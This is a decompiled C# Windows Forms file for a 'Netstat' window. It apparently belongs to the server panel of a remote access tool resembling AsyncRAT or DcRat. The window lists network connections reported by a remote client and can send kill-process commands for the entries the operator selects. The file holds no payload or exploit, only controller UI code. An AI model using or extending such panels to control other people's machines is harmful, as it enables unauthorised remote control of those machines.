using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraGrid;
using DevExpress.XtraGrid.Columns;
using DevExpress.XtraGrid.Views.Base;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Handle_Packet;

namespace Server.Forms;

public class FormNetstat : XtraForm
{
	private IContainer components;

	public System.Windows.Forms.Timer timer1;

	private PopupMenu popupMenuNetStat;

	private BarButtonItem KillNetProcessMenu;

	private BarButtonItem RefreshNetstatMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private GridControl gridControlNet;

	private GridView gridViewNet;

	private GridColumn IDColumn;

	private GridColumn LocalColumn;

	private GridColumn RemoteColumn;

	private GridColumn StateColumn;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage2;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	public FormNetstat()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormNetstat_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private void RefreshNetstatMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Netstat";
			msgPack.ForcePathObject("Option").AsString = "List";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		});
	}

	private async void KillNetProcessMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		int[] selectedRows = gridViewNet.GetSelectedRows();
		foreach (int index in selectedRows)
		{
			await Task.Run(delegate
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Netstat";
				msgPack.ForcePathObject("Option").AsString = "Kill";
				msgPack.ForcePathObject("ID").AsString = (string)gridViewNet.GetRowCellValue(index, IDColumn);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			});
		}
	}

	private void listViewNetstat_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuNetStat.ShowPopup(gridControlNet.PointToScreen(e.Location));
		}
	}

	public void LoadStates(string msg)
	{
		try
		{
			List<NetStatItem> list = new List<NetStatItem>();
			string[] array = msg.Split(new string[1] { "-=>" }, StringSplitOptions.None);
			int num;
			for (num = 0; num < array.Length; num++)
			{
				if (array[num].Length > 0)
				{
					list.Add(new NetStatItem
					{
						id = array[num],
						local = array[num + 1],
						remote = array[num + 2],
						state = array[num + 3]
					});
				}
				num += 3;
			}
			gridControlNet.DataSource = list;
		}
		catch
		{
		}
	}

	private void FormNetstat_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormNetstat));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.popupMenuNetStat = new DevExpress.XtraBars.PopupMenu(this.components);
		this.KillNetProcessMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RefreshNetstatMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.gridControlNet = new DevExpress.XtraGrid.GridControl();
		this.gridViewNet = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.IDColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.LocalColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.RemoteColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.StateColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.popupMenuNetStat).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlNet).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewNet).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage2.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.popupMenuNetStat.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.KillNetProcessMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RefreshNetstatMenu)
		});
		this.popupMenuNetStat.Manager = this.barManager1;
		this.popupMenuNetStat.Name = "popupMenuNetStat";
		this.KillNetProcessMenu.Caption = "Kill";
		this.KillNetProcessMenu.Id = 0;
		this.KillNetProcessMenu.Name = "KillNetProcessMenu";
		this.KillNetProcessMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(KillNetProcessMenu_ItemClick);
		this.RefreshNetstatMenu.Caption = "Refresh";
		this.RefreshNetstatMenu.Id = 1;
		this.RefreshNetstatMenu.Name = "RefreshNetstatMenu";
		this.RefreshNetstatMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RefreshNetstatMenu_ItemClick);
		this.barManager1.DockControls.Add(this.barDockControlTop);
		this.barManager1.DockControls.Add(this.barDockControlBottom);
		this.barManager1.DockControls.Add(this.barDockControlLeft);
		this.barManager1.DockControls.Add(this.barDockControlRight);
		this.barManager1.Form = this;
		this.barManager1.Items.AddRange(new DevExpress.XtraBars.BarItem[2] { this.KillNetProcessMenu, this.RefreshNetstatMenu });
		this.barManager1.MaxItemId = 2;
		this.barDockControlTop.CausesValidation = false;
		this.barDockControlTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.barDockControlTop.Location = new System.Drawing.Point(0, 0);
		this.barDockControlTop.Manager = this.barManager1;
		this.barDockControlTop.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlTop.Size = new System.Drawing.Size(723, 0);
		this.barDockControlBottom.CausesValidation = false;
		this.barDockControlBottom.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.barDockControlBottom.Location = new System.Drawing.Point(0, 530);
		this.barDockControlBottom.Manager = this.barManager1;
		this.barDockControlBottom.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlBottom.Size = new System.Drawing.Size(723, 0);
		this.barDockControlLeft.CausesValidation = false;
		this.barDockControlLeft.Dock = System.Windows.Forms.DockStyle.Left;
		this.barDockControlLeft.Location = new System.Drawing.Point(0, 0);
		this.barDockControlLeft.Manager = this.barManager1;
		this.barDockControlLeft.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlLeft.Size = new System.Drawing.Size(0, 530);
		this.barDockControlRight.CausesValidation = false;
		this.barDockControlRight.Dock = System.Windows.Forms.DockStyle.Right;
		this.barDockControlRight.Location = new System.Drawing.Point(723, 0);
		this.barDockControlRight.Manager = this.barManager1;
		this.barDockControlRight.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barDockControlRight.Size = new System.Drawing.Size(0, 530);
		this.gridControlNet.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlNet.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlNet.Location = new System.Drawing.Point(0, 0);
		this.gridControlNet.MainView = this.gridViewNet;
		this.gridControlNet.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlNet.MenuManager = this.barManager1;
		this.gridControlNet.Name = "gridControlNet";
		this.gridControlNet.Size = new System.Drawing.Size(721, 499);
		this.gridControlNet.TabIndex = 5;
		this.gridControlNet.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewNet });
		this.gridControlNet.MouseUp += new System.Windows.Forms.MouseEventHandler(listViewNetstat_MouseUp);
		this.gridViewNet.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[4] { this.IDColumn, this.LocalColumn, this.RemoteColumn, this.StateColumn });
		this.gridViewNet.DetailHeight = 284;
		this.gridViewNet.GridControl = this.gridControlNet;
		this.gridViewNet.Name = "gridViewNet";
		this.gridViewNet.OptionsView.ShowGroupPanel = false;
		this.IDColumn.Caption = "ID";
		this.IDColumn.FieldName = "id";
		this.IDColumn.MinWidth = 17;
		this.IDColumn.Name = "IDColumn";
		this.IDColumn.OptionsColumn.AllowEdit = false;
		this.IDColumn.Visible = true;
		this.IDColumn.VisibleIndex = 0;
		this.IDColumn.Width = 64;
		this.LocalColumn.Caption = "Local";
		this.LocalColumn.FieldName = "local";
		this.LocalColumn.MinWidth = 17;
		this.LocalColumn.Name = "LocalColumn";
		this.LocalColumn.OptionsColumn.AllowEdit = false;
		this.LocalColumn.Visible = true;
		this.LocalColumn.VisibleIndex = 1;
		this.LocalColumn.Width = 64;
		this.RemoteColumn.Caption = "Remote";
		this.RemoteColumn.FieldName = "remote";
		this.RemoteColumn.MinWidth = 17;
		this.RemoteColumn.Name = "RemoteColumn";
		this.RemoteColumn.OptionsColumn.AllowEdit = false;
		this.RemoteColumn.Visible = true;
		this.RemoteColumn.VisibleIndex = 2;
		this.RemoteColumn.Width = 64;
		this.StateColumn.Caption = "State";
		this.StateColumn.FieldName = "state";
		this.StateColumn.MinWidth = 17;
		this.StateColumn.Name = "StateColumn";
		this.StateColumn.OptionsColumn.AllowEdit = false;
		this.StateColumn.Visible = true;
		this.StateColumn.VisibleIndex = 3;
		this.StateColumn.Width = 64;
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage2;
		this.xtraTabControl2.Size = new System.Drawing.Size(723, 530);
		this.xtraTabControl2.TabIndex = 10;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage2 });
		this.xtraTabPage2.Controls.Add(this.gridControlNet);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(721, 499);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(723, 530);
		base.Controls.Add(this.xtraTabControl2);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormNetstat.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormNetstat.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormNetstat";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Netstat";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormNetstat_FormClosed);
		base.Load += new System.EventHandler(FormNetstat_Load);
		((System.ComponentModel.ISupportInitialize)this.popupMenuNetStat).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlNet).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewNet).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage2.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
